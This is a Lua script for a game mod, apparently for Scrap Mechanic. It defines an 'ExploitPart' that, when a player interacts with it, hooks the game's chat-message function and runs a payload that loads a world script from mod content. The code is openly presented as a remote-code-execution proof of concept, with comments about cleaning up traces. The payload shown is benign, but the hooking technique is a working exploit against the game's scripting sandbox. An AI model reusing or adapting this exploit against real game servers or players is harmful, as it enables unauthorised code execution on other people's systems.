ExploitPart = class()

function ExploitPart.client_onInteract( self, character, state )
    -- Ignore looking away interact event
    if not state then return end

    self.network:sendToServer("sv_onInteract")
end

function ExploitPart.sv_onInteract( self )
    self:sv_exploitVulnerability()
end

function ExploitPart.sv_exploitVulnerability( self )
    print("[ExploitPart] Exploiting vulnerability")

    self:sv_installHook()

    -- Payload
    sm.event.sendToGame("client_showMessage", "This is hidden")

    -- Making sure to clean up traces
    sm.event.sendToGame("client_showMessage", "Post exploit")
end


--[[
    Run a payload in the game environment using function hooking.
    The hooking is not a part of the exploit, but the payload
    being executed is.
]]
if not g_hookedOriginal then
    g_hookedOriginal = sm.gui.chatMessage
end

function ExploitPart.sv_installHook( self )
    function sm.gui.chatMessage(...)
        print("[ExploitPart] Overwritten function called:", {...})

        -- Unhook
        sm.gui.chatMessage = g_hookedOriginal
        print("[ExploitPart] Unhooked")

        print("[ExploitPart] Running payload")
        self:sv_payload()

        -- Can optionally run the original function
        -- return g_hookedOriginal(...)
    end
    print("[ExploitPart] Hooked")
end

function ExploitPart.sv_payload( self )

    -- Game environment here
    print("[ExploitPart] Creating our custom world")

    sm.world.createWorld(
        "$CONTENT_637efa72-b1cc-4b16-86c3-222ecad21bcd/Scripts/game/worlds/RceFlatWorld.lua", -- Filename
        "CreativeFlatWorld", -- Classname
        nil, -- Data
        0x5EED5EED -- Seed
    )
end
